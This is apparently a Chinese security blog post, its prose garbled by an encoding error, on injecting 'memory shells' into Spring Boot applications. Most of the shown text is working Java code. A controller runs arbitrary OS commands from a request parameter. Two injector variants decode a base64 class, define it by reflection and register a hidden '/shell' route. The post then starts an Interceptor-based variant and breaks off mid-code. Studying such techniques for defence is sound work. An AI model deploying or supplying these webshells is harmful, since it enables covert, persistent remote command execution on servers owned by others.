alt="image-20241113164444913"></p><p>å¯ä»¥çŸ¥é“ï¼Œæœ€ç»ˆå°±æ˜¯è°ƒç”¨çš„AbstractHandlerMethodMapping$MappingRegistryçš„registeræ–¹æ³•å°†è·¯ç”±å’Œæ–¹æ³•æ³¨å†Œè¿›å»çš„ï¼Œè·Ÿåˆ°è¿™é‡Œå°±å·²ç»å¤Ÿäº†</p><p>æ‰€ä»¥æˆ‘ä»¬è¦åˆ›å»ºä¸€ä¸ªcontrolleræœ€ç»ˆå°±æ˜¯è¦è°ƒç”¨MappingRegistry#registeræ–¹æ³•ï¼Œè°ƒç”¨è¿™ä¸ªæ–¹æ³•çš„æ¡ä»¶æ ¹æ®å‰é¢çš„åˆ†æå¯çŸ¥</p><ol><li>beanå®ä¾‹</li><li>å¤„ç†è¯·æ±‚çš„method</li><li>å¯¹åº”çš„RequestMappinginfoå¯¹è±¡</li></ol><h2 id="å†…å­˜é©¬å®ç°"><a href="#å†…å­˜é©¬å®ç°" class="headerlink" title="å†…å­˜é©¬å®ç°"></a>å†…å­˜é©¬å®ç°</h2><p>å‚è€ƒy4å¸ˆå‚…çš„å®ç°æ–¹å¼</p><p>é¦–å…ˆæˆ‘ä»¬è¦ç¼–å†™ä¸€ä¸ªæ­£å¸¸çš„controllerç±»ï¼Œä¹Ÿä¸èƒ½è¯´æ­£å¸¸å°±æ˜¯å»æ‰æ³¨è§£çš„controllerï¼Œå› ä¸ºæˆ‘ä»¬æ˜¯æ‰‹åŠ¨åŠ è½½çš„æ‰€ä»¥ä¸éœ€è¦æ³¨è§£</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RequestMethod;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span class="hljs-keyword">import</span> java.io.PrintWriter;<br><span class="hljs-keyword">import</span> java.util.Scanner;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestController</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">arg0</span> <span class="hljs-operator">=</span> request.getParameter(<span class="hljs-string">&quot;code&quot;</span>);<br>            <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">writer</span> <span class="hljs-operator">=</span> response.getWriter();<br>            <span class="hljs-keyword">if</span> (arg0 != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&quot;</span>;<br>                ProcessBuilder p;<br>                <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd.exe&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, arg0&#125;);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    p = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, arg0&#125;);<br>                &#125;<br><br>                <span class="hljs-type">Scanner</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(p.start().getInputStream())).useDelimiter(<span class="hljs-string">&quot;\\A&quot;</span>);<br>                o = c.hasNext() ? c.next() : o;<br>                c.close();<br>                writer.write(o);<br>                writer.flush();<br>                writer.close();<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                response.sendError(<span class="hljs-number">404</span>);<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;<br><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åå°†ä»–ç¼–è¯‘æˆ.classæ–‡ä»¶ï¼Œå†æ‹¿ä»–çš„base64ç¼–ç çš„å­—ç¬¦ä¸²ç”¨ä¸‹é¢ä»£ç æ³¨å…¥å†…å­˜é©¬</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAjQoAIQBJCABKCwBLAEwLAE0ATggATwgAUAoAUQBSCgAMAFMIAFQKAAwAVQcAVgcAVwgAWAgAWQoACwBaCABbCABcBwBdCgALAF4KAF8AYAoAEgBhCABiCgASAGMKABIAZAoAEgBlCgASAGYKAGcAaAoAZwBpCgBnAGYLAE0AagcAawcAbAcAbQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAVwcAbgcAVgcAXQcAawEAEE1ldGhvZFBhcmFtZXRlcnMBABlSdW50aW1lVmlzaWJsZUFubm90YXRpb25zAQA4TG9yZy9zcHJpbmdmcmFtZXdvcmsvd2ViL2JpbmQvYW5ub3RhdGlvbi9SZXF1ZXN0TWFwcGluZzsBAAV2YWx1ZQEABi9zaGVsbAEABm1ldGhvZAEAN0xvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVxdWVzdE1ldGhvZDsBAANHRVQBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQEAOExvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9iaW5kL2Fubm90YXRpb24vUmVzdENvbnRyb2xsZXI7DAAiACMBAARjb2RlBwBvDABwAHEHAHIMAHMAdAEAAAEAB29zLm5hbWUHAHUMAHYAcQwAdwB4AQADd2luDAB5AHoBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAiAHsBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAfAB9BwB+DAB/AIAMACIAgQEAAlxBDACCAIMMAIQAhQwAhgB4DACHACMHAG4MAIgAiQwAigAjDACLAIwBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQA5b3JnL2Nsb3duL3NwcmluZ2Jvb3RtZW1vcnlzaGVsbC9jb250b3JsbGVyL1Rlc3RDb250cm9sbGVyAQAQamF2YS9sYW5nL09iamVjdAEAE2phdmEvaW8vUHJpbnRXcml0ZXIBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAMZ2V0UGFyYW1ldGVyAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEACWdldFdyaXRlcgEAFygpTGphdmEvaW8vUHJpbnRXcml0ZXI7AQAQamF2YS9sYW5nL1N5c3RlbQEAC2dldFByb3BlcnR5AQALdG9Mb3dlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAWKFtMamF2YS9sYW5nL1N0cmluZzspVgEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAAVjbG9zZQEABXdyaXRlAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAFZmx1c2gBAAlzZW5kRXJyb3IBAAQoSSlWACEAIAAhAAAAAAACAAEAIgAjAAEAJAAAAC8AAQABAAAABSq3AAGxAAAAAgAlAAAABgABAAAADgAmAAAADAABAAAABQAnACgAAAABACkAKgADACQAAAGoAAYACAAAALMrEgK5AAMCAE4suQAEAQA6BC3GAJMSBToFEga4AAe2AAgSCbYACpkAIbsAC1kGvQAMWQMSDVNZBBIOU1kFLVO3AA86BqcAHrsAC1kGvQAMWQMSEFNZBBIRU1kFLVO3AA86BrsAElkZBrYAE7YAFLcAFRIWtgAXOgcZB7YAGJkACxkHtgAZpwAFGQU6BRkHtgAaGQQZBbYAGxkEtgAcGQS2AB2nAAwsEQGUuQAeAgCnAAROsQABAAAArgCxAB8AAwAlAAAASgASAAAAEgAJABMAEQAUABUAFQAZABcAKQAYAEcAGgBiAB0AeAAeAIwAHwCRACAAmAAhAJ0AIgCiACMApQAkAK4AKACxACYAsgApACYAAABcAAkARAADACsALAAGABkAiQAtAC4ABQBiAEAAKwAsAAYAeAAqAC8AMAAHAAkApQAxAC4AAwARAJ0AMgAzAAQAAACzACcAKAAAAAAAswA0ADUAAQAAALMANgA3AAIAOAAAACkACP4ARwcAOQcAOgcAOfwAGgcAO/wAJQcAPEEHADn4ABr5AAhCBwA9AAA+AAAACQIANAAAADYAAAA/AAAAGAABAEAAAgBBWwABcwBCAENbAAFlAEQARQACAEYAAAACAEcAPwAAAAYAAQBIAAA=&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>,d, <span class="hljs-number">0</span>, d.length&#125;);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> (Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).getDeclaredMethods())[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, Class.forName(<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>).newInstance(), mm);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello World&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬è®¿é—®helloè·¯ç”±çš„æ—¶å€™å°±èƒ½æˆåŠŸæ³¨å…¥å†…å­˜é©¬</p><p>å†å»è®¿é—®shellè·¯ç”±å°±èƒ½æ‰§è¡Œä»»æ„å‘½ä»¤äº†</p><p><img src="https://cdn.clown2024.cn/image-20241113172717161.png" alt="image-20241113172717161"></p><blockquote><p>è¿™é‡Œçš„å®ç°è¦æ±‚æœåŠ¡å™¨ä¸Šå¾—æœ‰ä½ çš„æ¶æ„ç±»ï¼Œä¸ç„¶Class.forNameè¿™é‡Œå°±ä¼šæŠ¥é”™ï¼Œé—®äº†ä¸€ä¸‹kimiä»–ç»™å‡ºçš„ç†ç”±å¦‚ä¸‹ï¼š</p><ol><li><strong>ç±»åŠ è½½æœºåˆ¶</strong>ï¼š<ul><li>Javaçš„ç±»åŠ è½½æœºåˆ¶æ˜¯åŸºäºç±»åŠ è½½å™¨çš„ã€‚æ¯ä¸ªç±»åŠ è½½å™¨éƒ½æœ‰è‡ªå·±çš„ç±»åŠ è½½ç¼“å­˜ã€‚</li><li>å½“ä½ ä½¿ç”¨<code>Class.forName</code>æ—¶ï¼Œå®ƒä¼šå°è¯•ä»å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ï¼ˆ<code>Thread.currentThread().getContextClassLoader()</code>ï¼‰åŠ è½½ç±»ã€‚</li><li>å¦‚æœç±»æ˜¯é€šè¿‡<code>defineClass</code>æ–¹æ³•åŠ¨æ€åˆ›å»ºçš„ï¼Œå®ƒä¸ä¼šè¢«ä»»ä½•ç±»åŠ è½½å™¨çš„ç¼“å­˜ï¼Œå› æ­¤æ— æ³•é€šè¿‡<code>Class.forName</code>æ‰¾åˆ°ã€‚</li></ul></li><li><strong><code>defineClass</code>æ–¹æ³•</strong>ï¼š<ul><li><code>defineClass</code>æ–¹æ³•æ˜¯<code>ClassLoader</code>ç±»çš„ä¸€ä¸ªæ–¹æ³•ï¼Œç”¨äºåŠ¨æ€åˆ›å»ºç±»ã€‚</li><li>é€šè¿‡<code>defineClass</code>åˆ›å»ºçš„ç±»ä¸ä¼šè¢«ç±»åŠ è½½å™¨çš„ç¼“å­˜ï¼Œå› æ­¤æ— æ³•é€šè¿‡å¸¸è§„çš„ç±»åŠ è½½æœºåˆ¶æ‰¾åˆ°ã€‚</li></ul></li></ol></blockquote><p>åæ¥åœ¨kimiçš„å¸®åŠ©ä¸‹æ”¹æˆè¿™æ ·å°±å¯ä»¥äº†ï¼Œå°±ä¸ç”¨Class.forNameï¼Œç›´æ¥è®©ä»–invokeçš„æ—¶å€™å¼ºè½¬æˆClasså°±å¯ä»¥ç”¨äº†</p><p>ä¿®æ”¹åçš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.contorller;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.GetMapping;<br><span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.RestController;<br><span class="hljs-keyword">import</span> org.springframework.web.context.WebApplicationContext;<br><span class="hljs-keyword">import</span> org.springframework.web.context.request.RequestContextHolder;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.RequestMappingInfo;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-meta">@RestController</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloController</span> &#123;<br><br>    <span class="hljs-meta">@GetMapping(&quot;/hello&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">hello</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">code</span> <span class="hljs-operator">=</span><span class="hljs-string">&quot;yv66vgAAADQAhQoAIQBBCABCCwBDAEQLAEUARggARwgASAoASQBKCgAMAEsIAEwKAAwATQcATgcATwgAUAgAUQoACwBSCABTCABUBwBVCgALAFYKAFcAWAoAEgBZCABaCgASAFsKABIAXAoAEgBdCgASAF4KAF8AYAoAXwBhCgBfAF4LAEUAYgcAYwcAZAcAZQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQA7TG9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcjsBAAR0ZXN0AQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcATwcAZgcATgcAVQcAYwEAEE1ldGhvZFBhcmFtZXRlcnMBAApTb3VyY2VGaWxlAQATVGVzdENvbnRyb2xsZXIuamF2YQwAIgAjAQAEY29kZQcAZwwAaABpBwBqDABrAGwBAAABAAdvcy5uYW1lBwBtDABuAGkMAG8AcAEAA3dpbgwAcQByAQAYamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAB2NtZC5leGUBAAIvYwwAIgBzAQAHL2Jpbi9zaAEAAi1jAQARamF2YS91dGlsL1NjYW5uZXIMAHQAdQcAdgwAdwB4DAAiAHkBAAJcQQwAegB7DAB8AH0MAH4AcAwAfwAjBwBmDACAAIEMAIIAIwwAgwCEAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAOW9yZy9jbG93bi9zcHJpbmdib290bWVtb3J5c2hlbGwvY29udG9ybGxlci9UZXN0Q29udHJvbGxlcgEAEGphdmEvbGFuZy9PYmplY3QBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBAAlnZXRXcml0ZXIBABcoKUxqYXZhL2lvL1ByaW50V3JpdGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVzdGFydAEAFSgpTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEAB2hhc05leHQBAAMoKVoBAARuZXh0AQAFY2xvc2UBAAV3cml0ZQEAFShMamF2YS9sYW5nL1N0cmluZzspVgEABWZsdXNoAQAJc2VuZEVycm9yAQAEKEkpVgAhACAAIQAAAAAAAgABACIAIwABACQAAAAvAAEAAQAAAAUqtwABsQAAAAIAJQAAAAYAAQAAAA0AJgAAAAwAAQAAAAUAJwAoAAAAAQApACoAAgAkAAABqAAGAAgAAACzKxICuQADAgBOLLkABAEAOgQtxgCTEgU6BRIGuAAHtgAIEgm2AAqZACG7AAtZBr0ADFkDEg1TWQQSDlNZBS1TtwAPOganAB67AAtZBr0ADFkDEhBTWQQSEVNZBS1TtwAPOga7ABJZGQa2ABO2ABS3ABUSFrYAFzoHGQe2ABiZAAsZB7YAGacABRkFOgUZB7YAGhkEGQW2ABsZBLYAHBkEtgAdpwAMLBEBlLkAHgIApwAETrEAAQAAAK4AsQAfAAMAJQAAAEoAEgAAABAACQARABEAEgAVABMAGQAVACkAFgBHABgAYgAbAHgAHACMAB0AkQAeAJgAHwCdACAAogAhAKUAIgCuACYAsQAkALIAJwAmAAAAXAAJAEQAAwArACwABgAZAIkALQAuAAUAYgBAACsALAAGAHgAKgAvADAABwAJAKUAMQAuAAMAEQCdADIAMwAEAAAAswAnACgAAAAAALMANAA1AAEAAACzADYANwACADgAAAApAAj+AEcHADkHADoHADn8ABoHADv8ACUHADxBBwA5+AAa+QAIQgcAPQAAPgAAAAkCADQAAAA2AAAAAQA/AAAAAgBA&quot;</span>;<br>        <span class="hljs-type">byte</span>[] d = <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.misc.BASE64Decoder().decodeBuffer(code);<br>        java.lang.reflect.<span class="hljs-type">Method</span> <span class="hljs-variable">m</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class&#125;);<br>        m.setAccessible(<span class="hljs-literal">true</span>);<br>        Class&lt;?&gt; clazz = (Class&lt;?&gt;) m.invoke(Thread.currentThread().getContextClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;org.clown.springbootmemoryshell.contorller.TestController&quot;</span>, d, <span class="hljs-number">0</span>, d.length&#125;);<br>        Constructor&lt;?&gt; constructor = clazz.getConstructor();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">instance</span> <span class="hljs-operator">=</span> constructor.newInstance();<br>        System.out.println(<span class="hljs-string">&quot;Instance created: &quot;</span> + instance);<br>        <span class="hljs-type">WebApplicationContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(<span class="hljs-string">&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;</span>, <span class="hljs-number">0</span>);<br>        <span class="hljs-type">PatternsRequestCondition</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PatternsRequestCondition</span>(<span class="hljs-string">&quot;/shell&quot;</span>);<br>        <span class="hljs-type">RequestMappingInfo</span> <span class="hljs-variable">info</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RequestMappingInfo</span>(url, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">RequestMappingHandlerMapping</span> <span class="hljs-variable">rs</span> <span class="hljs-operator">=</span> context.getBean(RequestMappingHandlerMapping.class);<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">mm</span> <span class="hljs-operator">=</span> clazz.getDeclaredMethods()[<span class="hljs-number">0</span>];<br>        rs.registerMapping(info, instance, mm);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Inject Successful!&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="interceptorå†…å­˜é©¬"><a href="#Interceptorå†…å­˜é©¬" class="headerlink" title="Interceptorå†…å­˜é©¬"></a>Interceptorå†…å­˜é©¬</h1><p>Interceptoræ˜¯springMvcçš„ç»„ä»¶ï¼Œæ‰€ä»¥ä»–åªä½œç”¨äºSpring MVCçš„è¯·æ±‚å¤„ç†æµç¨‹ï¼Œåªå¤„ç†é€šè¿‡Spring MVCçš„è¯·æ±‚</p><p>æ‰€ä»¥ä»–å’Œå…¶ä»–ç»„ä»¶ä¹Ÿæ˜¯æœ‰åŒºåˆ«çš„ï¼š</p><p><code>Filter</code>å’Œ<code>Listener</code>åœ¨Servletå®¹å™¨ä¸­é…ç½®ï¼Œé€šå¸¸åœ¨<code>web.xml</code>æ–‡ä»¶ä¸­æˆ–é€šè¿‡æ³¨è§£é…ç½®ã€‚</p><p><code>Interceptor</code>åœ¨Spring MVCä¸­é…ç½®ï¼Œé€šå¸¸åœ¨Springçš„é…ç½®æ–‡ä»¶æˆ–é…ç½®ç±»ä¸­ã€‚</p><ul><li><strong>æ‰§è¡Œé¡ºåº</strong>ï¼š<ul><li><code>Filter</code>åœ¨<code>Interceptor</code>ä¹‹å‰æ‰§è¡Œï¼Œå› ä¸º<code>Filter</code>åœ¨è¯·æ±‚åˆ°è¾¾Servletä¹‹å‰å°±å·²ç»æ‰§è¡Œã€‚</li><li><code>Interceptor</code>åœ¨<code>Filter</code>ä¹‹åã€Controllerä¹‹å‰æ‰§è¡Œã€‚</li><li><code>Listener</code>åœ¨åº”ç”¨å¯åŠ¨ã€å…³é—­ã€ä¼šè¯åˆ›å»ºã€é”€æ¯æ—¶æ‰§è¡Œï¼Œä¸è¯·æ±‚å¤„ç†æµç¨‹æ— å…³ã€‚</li></ul></li></ul><p>y4å¸ˆå‚…çš„æ–‡ç« ä¸­æ€»ç»“çš„è¯·æ±‚åˆ°è¾¾Controllerçš„é¡ºåºï¼š</p><p>HttpRequest â€“&gt; Filter â€“&gt; DispactherServlet â€“&gt; Interceptor â€“&gt; Aspect â€“&gt; Controller</p><h2 id="interceptorç¼–å†™"><a href="#Interceptorç¼–å†™" class="headerlink" title="Interceptorç¼–å†™"></a>Interceptorç¼–å†™</h2><p>å…ˆç¼–å†™ä¸€ä¸ªç®€å•çš„interceptorï¼Œå’Œä¸Šé¢çš„controllerä¸€æ ·å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.springbootmemoryshell.interceptor;<br><br><br><span class="hljs-keyword">import</span> org.springframework.web.servlet.HandlerInterceptor;<br><span class="hljs-keyword">import</span> org.springframework.web.servlet.ModelAndView;<br><br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletRequest;<br><span class="hljs-keyword">import</span> javax.servlet.http.HttpServletResponse;<br><span 